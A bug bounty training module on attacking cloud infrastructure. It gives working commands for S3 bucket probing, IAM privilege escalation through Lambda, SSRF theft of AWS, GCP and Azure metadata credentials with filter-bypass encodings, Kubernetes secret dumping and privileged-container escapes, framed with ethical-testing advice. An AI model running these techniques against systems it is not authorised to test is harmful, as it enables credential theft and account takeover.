Cloud Security

Bug Hunting • Module 10 • Cloud Infrastructure Exploitation

Cloud misconfigurations have surpassed traditional web vulnerabilities as the leading source of critical findings in modern bug bounty programs. Every major organization runs on AWS, Azure, or GCP — and every one of them has storage buckets with overly permissive ACLs, IAM policies granting unintended privilege escalation paths, metadata services reachable through SSRF, and Kubernetes clusters with default configurations that were never hardened. This module covers the complete cloud attack surface: from S3 enumeration and IAM abuse through container escapes and serverless exploitation. Cloud is where the critical bounties live.

Section 01

☁ Cloud Security Landscape

The cloud fundamentally changed the security model. In traditional infrastructure, the organization controls everything from the physical hardware to the application layer. In the cloud, responsibility is shared between the cloud provider and the customer — and that boundary is where the vulnerabilities concentrate. AWS, Azure, and GCP secure the infrastructure itself with world-class engineering. But everything the customer configures on top of that infrastructure — storage permissions, IAM policies, network rules, encryption settings — is the customer's problem. And customers get it wrong constantly.

The Shared Responsibility Model

Every major cloud provider defines a shared responsibility model that splits security obligations between themselves and the customer. The provider secures the physical data centers, the hypervisor, the network fabric, and the core service APIs. The customer is responsible for identity management, access policies, data encryption, network configuration, and operating system patches on compute instances. Most cloud vulnerabilities exist in the customer-controlled layer — the provider side is battle-tested by billions of API calls daily.

Provider Responsibility

  • ▸Physical security of data centers
  • ▸Hypervisor and host OS security
  • ▸Network infrastructure and DDoS protection
  • ▸Service API availability and integrity
  • ▸Hardware lifecycle and firmware patches
  • ▸Global backbone encryption in transit

Customer Responsibility

  • ▸IAM policies, roles, and access keys
  • ▸Storage bucket permissions and ACLs
  • ▸Network security groups and firewall rules
  • ▸Data encryption at rest and key management
  • ▸OS patching on EC2/VM instances
  • ▸Application-level security and secrets management

Why Cloud Misconfigs Dominate Bug Bounties

Cloud misconfigurations are the number one source of critical infrastructure findings in modern bounty programs. The reasons are structural. Cloud platforms offer thousands of configuration options across hundreds of services. Default settings frequently prioritize usability over security. Development teams spin up resources quickly without security review. Infrastructure-as-Code templates get copied from Stack Overflow without understanding their permission implications. And cloud environments change constantly — a secure configuration today can become insecure after a single policy update tomorrow.

Storage Exposure
S3 buckets, Azure Blobs, and GCP Storage objects with public read or write permissions. Entire databases, backups, source code, and credentials exposed to anyone who guesses the bucket name.
Critical
IAM Misconfiguration
Overly permissive IAM policies, wildcard permissions, roles assumable by any authenticated AWS user, and service accounts with admin-level access that were meant to be temporary.
High Impact
Network Misconfig
Security groups allowing 0.0.0.0/0 ingress on management ports, VPCs with no network segmentation, load balancers forwarding traffic to internal services without authentication.
Infrastructure
Multi-Cloud Sprawl
Organizations running workloads across AWS, Azure, and GCP simultaneously. Each platform has different security primitives, different defaults, and different audit tooling. Complexity multiplies attack surface.
Growing Risk
ℹ
Cloud Attack Surface Is Expanding
Every new AWS service announcement adds new configuration surfaces and new potential for misconfiguration. AWS alone has over 200 services. Azure and GCP continue to expand at similar rates. Security teams cannot review every new service configuration as fast as development teams adopt them. This gap between adoption speed and security review capacity is the structural advantage cloud bug hunters exploit.
Section 02

AWS S3 Bucket Enumeration

S3 bucket misconfiguration remains one of the most common and most impactful cloud vulnerabilities. Companies store application data, database backups, log files, deployment artifacts, and customer data in S3 — often with permissions far more liberal than intended. The first step is finding the buckets. The second step is testing what you can access.

Bucket Discovery Techniques

S3 bucket names are globally unique across all AWS accounts. If you can guess or discover the name, you can attempt to interact with it regardless of which account owns it. This makes bucket enumeration a passive reconnaissance technique — you are testing name resolution, not sending requests to the target's infrastructure.

  • Naming pattern prediction — Companies follow predictable patterns: companyname-backups, companyname-prod, companyname-staging, companyname-assets, companyname-logs
  • Google Dorking — Search for site:s3.amazonaws.com "companyname" or inurl:s3.amazonaws.com companyname to find buckets referenced in public web pages
  • Certificate Transparency — S3 buckets with custom domains require TLS certificates, which are logged in CT logs and searchable via crt.sh
  • Source code analysis — JavaScript source, mobile app binaries, and configuration files frequently reference S3 bucket URLs directly
  • DNS CNAME records — Subdomains with CNAME records pointing to .s3.amazonaws.com reveal bucket names and may indicate subdomain takeover potential if the bucket is deleted
  • GitHub search — Search the target's domain name or known bucket patterns in public GitHub repositories for hardcoded S3 references

Testing Bucket Permissions

Once you have discovered bucket names, systematically test what operations are permitted. The AWS CLI is the primary tool. Test both unauthenticated (no AWS credentials) and authenticated (with any valid AWS account) access — many misconfigurations grant access to the AuthenticatedUsers group, which means any AWS account holder in the world.

# Test unauthenticated bucket listing $ aws s3 ls s3://target-company-assets --no-sign-request # If this returns a file listing, the bucket allows public read # Test unauthenticated file read $ aws s3 cp s3://target-company-assets/test.txt - --no-sign-request # Test authenticated listing (using your own AWS creds) $ aws s3 ls s3://target-company-assets # Check bucket ACL $ aws s3api get-bucket-acl --bucket target-company-assets --no-sign-request # Check bucket policy $ aws s3api get-bucket-policy --bucket target-company-assets --no-sign-request # Test write access (upload a harmless proof file, never overwrite existing data) $ echo "security-test-by-researcher" | \ aws s3 cp - s3://target-company-assets/security-test.txt --no-sign-request

Section 03

AWS IAM Privilege Escalation

AWS Identity and Access Management controls who can do what within an AWS account. IAM policies are JSON documents that grant or deny permissions on specific resources. The complexity of IAM — thousands of possible actions across hundreds of services, combined with policy inheritance, permission boundaries, and cross-account trust relationships — creates a vast surface for privilege escalation. A low-privilege set of credentials with the right combination of permissions can escalate to full administrator access through over twenty documented escalation paths.

Dangerous IAM Permissions

Certain IAM permissions are inherently dangerous because they allow a principal to expand its own access or impersonate other principals with higher privileges. These permissions are frequently granted without understanding their escalation potential.

Permission Escalation Path
iam:CreatePolicy Create a new policy with *:* permissions and attach it to your own user or role
iam:AttachUserPolicy Attach the AWS-managed AdministratorAccess policy to your own user account
iam:PassRole + lambda:CreateFunction Create a Lambda function that assumes a high-privilege role, execute the function, and inherit that role's permissions
iam:PassRole + ec2:RunInstances Launch an EC2 instance with a high-privilege instance profile, then access the metadata service from the instance to get temporary credentials
sts:AssumeRole Assume a different role with higher permissions. If the trust policy is overly permissive, any principal in the account (or cross-account) can assume it
iam:CreateLoginProfile Create a console login for an IAM user that only has API access, potentially for an admin user without a current password
iam:UpdateAssumeRolePolicy Modify a role's trust policy to allow your own principal to assume it, then assume the role and inherit its permissions
iam:PutUserPolicy Attach an inline policy to your own user granting any permissions you choose
lambda:UpdateFunctionCode Replace the code of an existing Lambda function that runs with a high-privilege role, inject your payload, then invoke it
glue:CreateDevEndpoint + iam:PassRole Create a Glue development endpoint with an SSH key you control, passing a high-privilege service role. SSH into the endpoint and use the role's credentials

Enumerating IAM Permissions

Before escalating, you need to know what permissions you currently hold. When you obtain AWS credentials (from an exposed .env file, SSRF to metadata, or a leaked access key), the first step is always enumeration of the identity and its attached permissions.

# Identify who you are $ aws sts get-caller-identity { "UserId": "AIDAJQABLZS4A3QDU576Q", "Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/webapp-deploy" } # List your attached policies $ aws iam list-attached-user-policies --user-name webapp-deploy $ aws iam list-user-policies --user-name webapp-deploy # Get policy document to see actual permissions $ aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/DeployPolicy \ --version-id v1 # List all roles (to find assumable targets) $ aws iam list-roles | jq '.Roles[] | {RoleName, Arn}'

Escalation Requires Existing Credentials
IAM privilege escalation starts from a position of some access. You need valid AWS credentials before any of these techniques apply. In bug bounty, those credentials typically come from exposed .env files, SSRF to the instance metadata service, leaked access keys in source code or GitHub, or misconfigured application endpoints that return AWS credentials in error messages. The credential discovery is the hard part; the escalation is the high-impact follow-through.

Example: PassRole + Lambda Escalation

One of the most common escalation paths. If your credentials have iam:PassRole and lambda:CreateFunction plus lambda:InvokeFunction, you can escalate to any role the Lambda service is allowed to assume.

# 1. Identify a high-privilege role that Lambda can assume $ aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Service == "lambda.amazonaws.com") | .RoleName' "AdminLambdaExecutionRole" # 2. Create a Lambda function that uses the admin role $ aws lambda create-function \ --function-name escalation-test \ --runtime python3.9 \ --role arn:aws:iam::123456789012:role/AdminLambdaExecutionRole \ --handler index.handler \ --zip-file fileb://escalation.zip # 3. The Lambda function's code calls STS to prove admin access # import boto3; sts = boto3.client('sts'); print(sts.get_caller_identity()) # 4. Invoke the function and observe admin-level identity $ aws lambda invoke --function-name escalation-test output.json $ cat output.json
Section 04

SSRF to Cloud Metadata

Server-Side Request Forgery becomes catastrophically dangerous in cloud environments because of the instance metadata service. Every cloud compute instance (EC2, Azure VM, GCP Compute Engine) runs a metadata API on a link-local address that returns sensitive configuration data — including temporary IAM credentials. An SSRF vulnerability in any application running on a cloud instance can be leveraged to steal the instance's cloud credentials and pivot to the broader cloud account. This is the single most impactful SSRF exploitation path in modern environments.

AWS Instance Metadata Service (IMDS)

The AWS metadata service runs at 169.254.169.254 and is accessible from any process running on the instance without authentication. It returns instance identity, network configuration, user data scripts, and — critically — temporary IAM role credentials that refresh automatically.

# IMDSv1 — simple GET request, no authentication $ curl http://169.254.169.254/latest/meta-data/ ami-id hostname iam/ instance-id local-ipv4 public-ipv4 security-groups # Get the IAM role name $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ webapp-ec2-role # Extract temporary credentials (AccessKeyId, SecretAccessKey, Token) $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-ec2-role { "AccessKeyId": "ASIAJEXAMPLEKEY", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "Token": "FwoGZXIvYXdzE...", "Expiration": "2026-02-28T12:00:00Z" } # User data often contains bootstrap scripts with hardcoded secrets $ curl http://169.254.169.254/latest/user-data

IMDSv1 vs IMDSv2

IMDSv1 uses simple HTTP GET requests with no authentication. IMDSv2 requires a session token obtained via a PUT request with a TTL header. This makes IMDSv2 significantly harder to exploit via SSRF because most SSRF vulnerabilities only allow GET requests, and the PUT request with custom headers required for IMDSv2 token retrieval cannot be triggered through typical SSRF vectors.

IMDSv1 (Vulnerable)

  • ▸Simple GET to 169.254.169.254
  • ▸No authentication required
  • ▸Exploitable via any SSRF (GET-based)
  • ▸Still enabled by default on many instances
  • ▸Single request returns credentials

IMDSv2 (Hardened)

  • ▸Requires PUT request with TTL header to get token
  • ▸Token must be included in subsequent GET requests
  • ▸PUT with custom headers blocks most SSRF vectors
  • ▸Token has configurable TTL (max 6 hours)
  • ▸Hop limit of 1 prevents container-based forwarding
# IMDSv2 token retrieval (requires PUT + custom header) $ TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") # Use token for subsequent metadata requests $ curl -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-ec2-role

GCP and Azure Metadata Endpoints

Azure and GCP have their own metadata services with different URLs and slightly different protections, but the fundamental risk is the same: SSRF to metadata yields cloud credentials.

# GCP Metadata Server $ curl -H "Metadata-Flavor: Google" \ http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token # GCP also exposes project-level metadata and SSH keys $ curl -H "Metadata-Flavor: Google" \ http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys # Azure Instance Metadata Service (IMDS) $ curl -H "Metadata: true" \ "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" # Azure IMDS requires Metadata: true header (similar to GCP's Metadata-Flavor)

SSRF to Account Compromise Chain

  1. Discover SSRF — URL parameter, webhook URL, PDF generator, image proxy, or any server-side HTTP request that accepts user-controlled URLs
  2. Fetch metadata credentials — Redirect the SSRF to http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
  3. Enumerate current access — Use the stolen credentials with aws sts get-caller-identity and enumerate attached policies
  4. Assess scope — Determine what the role can access: S3 buckets, DynamoDB tables, Lambda functions, Secrets Manager, other accounts via cross-account roles
  5. Attempt escalation — If the role has dangerous IAM permissions (PassRole, AssumeRole, CreatePolicy), escalate using the techniques from Section 03
  6. Document and report — Show the full chain: SSRF endpoint, credentials obtained, permissions enumerated, and potential impact. Do not access production data.
✓
SSRF Bypass Techniques for Metadata
Applications often block 169.254.169.254 directly. Common bypasses include: decimal IP notation (http://2852039166/), hex notation (http://0xa9fea9fe/), DNS rebinding (register a domain that resolves to the metadata IP), IPv6 notation, and URL encoding variations. Also test redirect-based SSRF: point the URL to a server you control that returns a 302 redirect to the metadata service.
Section 05

☍ Azure & GCP Security

While AWS dominates the cloud market, Azure and GCP each have their own unique attack surfaces and misconfigurations. Azure's tight integration with Active Directory creates hybrid identity attack paths. GCP's project-based structure and default service account behavior introduce different risks. Understanding all three platforms is essential because large organizations frequently run multi-cloud environments, and attackers who only know AWS miss entire categories of findings.

Azure-Specific Attacks

Exposed Azure Blob Storage
▼

Azure Blob Storage is the equivalent of S3. Containers can be set to Public access level: Blob (anonymous read of individual blobs if you know the name) or Public access level: Container (anonymous listing and reading of all blobs). Storage account names are globally unique subdomains under .blob.core.windows.net.

# Enumerate Azure storage account + container $ curl "https://targetcompany.blob.core.windows.net/backups?restype=container&comp=list" # Download a specific blob $ curl "https://targetcompany.blob.core.windows.net/backups/db-dump-2026.sql" -o dump.sql
Managed Identity Abuse
▼

Azure Managed Identities are analogous to AWS IAM roles for EC2. A VM or App Service with a managed identity can request access tokens from the metadata service without any credentials. If you compromise an application running on an Azure resource with a managed identity, you can request tokens for any Azure service the identity has access to.

# Request a token for Azure Resource Manager $ curl -H "Metadata: true" \ "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" # Request a token for Azure Key Vault $ curl -H "Metadata: true" \ "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" # Use the token to list resources $ curl -H "Authorization: Bearer <TOKEN>" \ "https://management.azure.com/subscriptions?api-version=2020-01-01"
App Service Misconfigurations
▼

Azure App Service (web app hosting) has several common misconfigurations: exposed SCM/Kudu deployment endpoints at https://appname.scm.azurewebsites.net, publicly accessible application settings containing connection strings, FTP deployment credentials left enabled, and debug endpoints leaking environment variables. The SCM endpoint is particularly dangerous because it provides a web-based console with file system access.

GCP-Specific Attacks

Public Cloud Storage Buckets
▼

GCP Cloud Storage follows the same pattern as S3: globally unique bucket names, ACL-based permissions, and common misconfigurations granting public access. GCP buckets are accessible at storage.googleapis.com/BUCKET_NAME or BUCKET_NAME.storage.googleapis.com.

# List bucket contents (if publicly readable) $ curl "https://storage.googleapis.com/storage/v1/b/target-bucket/o" # Using gsutil $ gsutil ls gs://target-bucket/ $ gsutil cp gs://target-bucket/config.json .
Service Account Key Exposure
▼

GCP service accounts use JSON key files for authentication. These files are frequently committed to repositories, stored in public buckets, or left in accessible deployment artifacts. Unlike AWS temporary credentials, GCP service account keys do not expire until explicitly rotated — a leaked key provides persistent access.

# GCP service account key file structure { "type": "service_account", "project_id": "target-project-123", "private_key_id": "abc123...", "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...", "client_email": "deploy@target-project-123.iam.gserviceaccount.com" } # Authenticate with a discovered key file $ gcloud auth activate-service-account --key-file found-key.json $ gcloud projects list $ gcloud iam service-accounts list --project target-project-123
GCP Default Service Account
▼

GCP assigns a default service account to compute instances with the Editor role unless explicitly configured otherwise. The Editor role grants read/write access to most GCP services in the project. Any SSRF or command injection on a GCP instance running with the default service account provides near-admin access to the entire GCP project via the metadata service.

Multi-Cloud Complexity Is Your Advantage
Most security teams are experts in one cloud platform and have passing familiarity with the others. Organizations running multi-cloud environments often have strong AWS security but weaker Azure or GCP configurations, because their security tooling and expertise concentrates on the primary platform. The secondary cloud provider is where the misconfigurations accumulate. If a target's primary infrastructure is on AWS, check whether they have Azure AD or GCP projects as well.
Section 06

Kubernetes & Container Security

Kubernetes is the de facto standard for container orchestration, and it introduces an entirely new layer of security configuration between the cloud provider and the application. A Kubernetes cluster has its own RBAC system, its own network policies, its own secrets management, and its own API server that controls everything. Misconfigurations at the Kubernetes layer can expose the entire cluster regardless of how well the underlying cloud infrastructure is configured.

Kubernetes RBAC Misconfigurations

Kubernetes Role-Based Access Control defines what actions (verbs) subjects (users, groups, service accounts) can perform on which resources (pods, secrets, configmaps). The most common misconfiguration is binding the cluster-admin ClusterRole to service accounts or groups that should have limited access.

# Check your current permissions within a cluster $ kubectl auth can-i --list # Check if you can read secrets (often the highest-value target) $ kubectl auth can-i get secrets --all-namespaces # List all cluster role bindings (who has cluster-admin?) $ kubectl get clusterrolebindings -o json | \ jq '.items[] | select(.roleRef.name == "cluster-admin") | .subjects' # Enumerate secrets in the current namespace $ kubectl get secrets $ kubectl get secret db-credentials -o jsonpath='{.data}' | \ jq 'to_entries[] | .value |= @base64d'

Exposed Kubernetes Dashboards and APIs

The Kubernetes Dashboard provides a web UI for cluster management. When exposed to the internet without authentication (or with a default token), it grants full cluster control. The API server itself, if exposed without authentication, allows arbitrary resource creation, modification, and deletion — including deploying containers with host-mounted volumes.

  • Dashboard without auth — Search Shodan for title:"Kubernetes Dashboard". Default installations sometimes skip the authentication proxy, exposing full cluster management
  • Anonymous API access — Test curl -k https://TARGET:6443/api/v1/namespaces. If it returns data without credentials, the API server allows anonymous access
  • Exposed etcd — etcd stores all Kubernetes state including secrets. Port 2379 exposed without TLS client auth means full cluster data access: etcdctl get / --prefix
  • Kubelet API — Port 10250 on worker nodes. If unauthenticated, allows running commands inside any container on that node via /run endpoint

Container Escape Techniques

A container is meant to isolate workloads from the host kernel and other containers. Container escapes break that isolation and give the attacker access to the underlying host — which in a Kubernetes environment means potential access to the node's service account, other containers, and the kubelet.

Privileged Container Escape
▼

Containers running with privileged: true have full access to the host's devices, can mount the host filesystem, and can load kernel modules. Escaping is trivial:

# Inside a privileged container: mount the host filesystem $ mkdir /mnt/host $ mount /dev/sda1 /mnt/host $ chroot /mnt/host bash # You now have a root shell on the host node # Alternative: access host PID namespace $ nsenter --target 1 --mount --uts --ipc --net --pid bash
Service Account Token Abuse
▼

Every pod in Kubernetes receives a service account token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. If the service account has broad permissions, this token can be used to interact with the Kubernetes API from inside the container.

# Read the mounted service account token $ cat /var/run/secrets/kubernetes.io/serviceaccount/token # Use the token to query the Kubernetes API $ APISERVER=https://kubernetes.default.svc $ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) $ curl -k -H "Authorization: Bearer $TOKEN" \ "$APISERVER/api/v1/namespaces/default/secrets"
Host Path Mount Escape
▼

Pods with hostPath volume mounts can read and write to the host filesystem without being privileged. A hostPath: / mount gives full host filesystem access. Even limited mounts like hostPath: /var/log can be leveraged to read sensitive host data or write cron jobs.

Container Escapes Are Critical Findings
A container escape in a production Kubernetes cluster is almost always a critical severity finding. The escaped attacker gains host-level access, which typically provides the node's cloud credentials (via the instance metadata service), access to other containers on the same node (including their secrets and network connections), and potentially the ability to pivot to the Kubernetes control plane if the node's kubelet token has sufficient permissions.
Section 07

Serverless & Terraform

Serverless computing and Infrastructure-as-Code represent two sides of the modern cloud deployment model. Serverless (Lambda, Azure Functions, Cloud Functions) moves the attack surface from operating system and runtime configuration to application logic and event triggers. Terraform and other IaC tools introduce a different risk: the state files and plan outputs that contain every secret, credential, and configuration detail for the entire infrastructure.

Lambda and Cloud Functions Attack Surface

Serverless functions eliminate traditional attack vectors (no SSH, no OS-level exploits) but introduce new ones. The function's event source (API Gateway, S3 triggers, SQS messages) becomes the injection point. The function's environment variables become the credential store. And the function's IAM role determines the blast radius of any compromise.

Event Injection
Lambda functions process events from API Gateway, S3, SQS, SNS, DynamoDB Streams, and more. The event data is the user input. If the function parses event data without validation, it is vulnerable to injection attacks — command injection, SQL injection, or deserialization attacks depending on the runtime and libraries used.
Input Validation
Environment Variable Leaks
Developers frequently store database credentials, API keys, and encryption keys in Lambda environment variables. If you can trigger a verbose error response or access the Lambda configuration via API, all environment variables are exposed as plaintext.
Secrets Exposure
Serverless SSRF
Lambda functions run in AWS-managed VPCs with internet access. SSRF in a Lambda function cannot reach 169.254.169.254 (Lambda uses a different credential mechanism), but can reach internal VPC resources, other AWS services, and any internal network the Lambda is configured to access.
Network Pivot
Overprivileged Roles
Lambda execution roles often have wildcard permissions because developers grant broad access during development and never restrict them. A compromised function with s3:* or dynamodb:* can access every table or bucket in the account.
IAM Abuse

Terraform State File Exposure

Terraform stores the complete state of managed infrastructure in a state file (terraform.tfstate). This file contains every resource attribute Terraform manages — including database passwords, API keys, private keys, and access tokens in plaintext. State files are the single most dangerous artifact in any IaC deployment.

Terraform State Files Contain All Secrets
Every terraform.tfstate file contains the plaintext value of every secret managed by Terraform: database passwords, IAM access keys, TLS private keys, API tokens, and encryption keys. A single exposed state file can compromise an entire cloud infrastructure. State files are commonly found in public S3 buckets, exposed Git repositories, CI/CD artifacts, and misconfigured Terraform Cloud workspaces.
# Terraform state file structure (simplified) { "version": 4, "resources": [ { "type": "aws_db_instance", "name": "production", "instances": [{ "attributes": { "address": "prod-db.abc123.us-east-1.rds.amazonaws.com", "username": "admin", "password": "SuperSecretP@ssw0rd!" // plaintext } }] }, { "type": "aws_iam_access_key", "name": "deploy_key", "instances": [{ "attributes": { "id": "AKIAIOSFODNN7EXAMPLE", "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // plaintext } }] } ] }

IaC Misconfigurations

Beyond state file exposure, the Terraform configuration files themselves (.tf files) reveal the entire infrastructure architecture and often contain hardcoded secrets, overly permissive security group rules, and resources intentionally configured without encryption or authentication.

  • Hardcoded secrets in .tf files — Database passwords, API keys, and access tokens embedded directly in resource definitions instead of using variables or Vault
  • Overly permissive security groups — ingress { cidr_blocks = ["0.0.0.0/0"] } on ports that should be restricted to internal access
  • Unencrypted resources — S3 buckets, EBS volumes, RDS instances, and DynamoDB tables without encryption at rest enabled
  • Public resources by default — S3 bucket ACLs set to public-read, RDS instances with publicly_accessible = true
  • Terraform plan injection — In CI/CD pipelines, if an attacker can modify .tf files before terraform plan runs, they can inject data sources that exfiltrate secrets during the planning phase (before any human review)

Tools like tfsec, checkov, and terrascan scan Terraform configurations for security misconfigurations before deployment. Section 08

Cloud Bug Bounty Strategy

Cloud vulnerabilities in bug bounty programs require a different approach than traditional web application testing. The attack surface is infrastructure rather than UI. The evidence is API responses and CLI output rather than screenshots of reflected XSS. And the impact assessment requires demonstrating what the misconfiguration enables rather than just that it exists. A public S3 bucket listing empty test files is informational. A public S3 bucket listing database backups with customer PII is critical. Same vulnerability, vastly different impact.

Cloud Provider Bug Bounty Programs

Provider Program Scope Notes
AWS AWS Vulnerability Reporting AWS service vulnerabilities, not customer misconfigs Report via HackerOne. Focused on flaws in AWS-managed services. Customer misconfigs are out of scope.
Microsoft Azure Microsoft Bug Bounty Azure services, Azure AD, M365 cloud Well-structured program with clear scope. Azure AD and identity federation bugs are high-priority targets.
Google Cloud Google VRP GCP services, Google Cloud infrastructure Part of the broader Google VRP. Strong payouts for GKE, IAM, and cross-tenant vulnerabilities.
Customer Programs Various (HackerOne, Bugcrowd) Customer-controlled cloud infrastructure Most bounty programs include cloud misconfigurations if they affect the target's assets. S3 buckets, exposed APIs, and metadata leaks are in scope.

Cloud-Specific Reporting Considerations

  1. Demonstrate the full chain — Do not just report "S3 bucket is public." Show what data is accessible, what the bucket contains (without downloading PII), and what an attacker could achieve. A bucket with source code has different impact than a bucket with marketing images.
  2. Prove credential validity without abuse — If you obtain cloud credentials via SSRF or leaked keys, use sts:GetCallerIdentity to prove they work and enumerate permissions to show potential impact. Do not access production data, create resources, or modify infrastructure.
  3. Include remediation steps — Cloud teams may not understand IAM policy nuances. Include specific remediation: "Remove the iam:PassRole permission from the deploy user policy" is more actionable than "fix IAM permissions."
  4. Capture evidence thoroughly — Cloud findings are transient. Credentials rotate, buckets get locked down, configurations change. Capture complete CLI output, timestamps, and HTTP request/response pairs at the time of discovery.
  5. Classify impact accurately — An exposed metadata service returning credentials for a role with AdministratorAccess is critical. The same SSRF returning credentials for a role with only CloudWatch read access is medium. The vulnerability is the same; the impact depends on what the credentials can do.
  6. Note credential expiration — STS temporary credentials expire (typically 1-12 hours). IAM access keys persist until rotated. GCP service account keys never expire. Note the credential type and expiration in your report because it affects the remediation urgency.

Cloud Hunting Methodology

  1. Identify the cloud provider — DNS records (CNAME to amazonaws.com, azurewebsites.net, googleapis.com), HTTP headers (x-amz-*, x-ms-*, x-goog-*), IP range lookups, and certificate subjects
  2. Enumerate storage — Use cloud_enum, Google dorking, and naming pattern prediction to discover S3 buckets, Azure Blob containers, and GCP Storage buckets
  3. Test storage permissions — Check listing, reading, writing, and ACL access on every discovered storage resource, both unauthenticated and with your own cloud credentials
  4. Hunt for credentials — Check source code, .env files, GitHub repos, Terraform state, CI/CD artifacts, and SSRF vectors for exposed cloud credentials
  5. Enumerate and escalate — For any credentials found, identify the principal, enumerate permissions, and test for privilege escalation paths
  6. Check Kubernetes exposure — Scan for exposed dashboards (443, 8443), API servers (6443), etcd (2379), and Kubelet (10250) on discovered IP ranges
  7. Review IaC artifacts — Search for exposed Terraform state files, CloudFormation templates, and Helm charts that reveal infrastructure details and secrets
  8. Document and report — Capture complete evidence with timestamps, demonstrate the full attack chain, quantify the impact, and provide specific remediation guidance

Cloud Is the Future of Bug Bounty
As organizations continue migrating to the cloud, the proportion of critical findings that involve cloud infrastructure will only increase. Researchers who combine traditional web application testing skills with deep cloud platform knowledge will find the highest-impact vulnerabilities — the SSRF that chains to metadata credential theft, the public bucket containing database backups, the IAM policy that allows any authenticated user to escalate to admin. These are the findings that earn four- and five-figure bounties.
